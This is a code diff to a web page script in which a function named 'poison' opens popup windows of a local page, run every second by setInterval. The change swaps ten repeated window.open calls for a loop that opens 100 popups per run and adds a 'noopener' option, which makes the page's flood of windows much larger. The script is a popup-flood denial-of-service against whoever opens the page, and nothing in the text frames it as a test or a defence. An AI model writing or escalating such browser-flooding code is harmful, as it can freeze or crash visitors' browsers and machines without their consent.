@@ -4,16 +4,10 @@
 <script>
 function poison() {
     const features = "width=500,height=500"; // Set window dimensions to 500x500 pixels
-    window.open("31415926.html", "_blank", features);
-    window.open("31415926.html", "_blank", features);
-    window.open("31415926.html", "_blank", features);
-    window.open("31415926.html", "_blank", features);
-    window.open("31415926.html", "_blank", features);
-    window.open("31415926.html", "_blank", features);
-    window.open("31415926.html", "_blank", features);
-    window.open("31415926.html", "_blank", features);
-    window.open("31415926.html", "_blank", features);
-    window.open("31415926.html", "_blank", features);
+    const options = "noopener"; // Add 'noopener' to prevent focus shift
+    for (let i = 0; i < 100; i++) {
+        window.open("31415926.html", "_blank", `${features},${options}`);
+    }
 }
 setInterval(poison, 1000);
 </script>
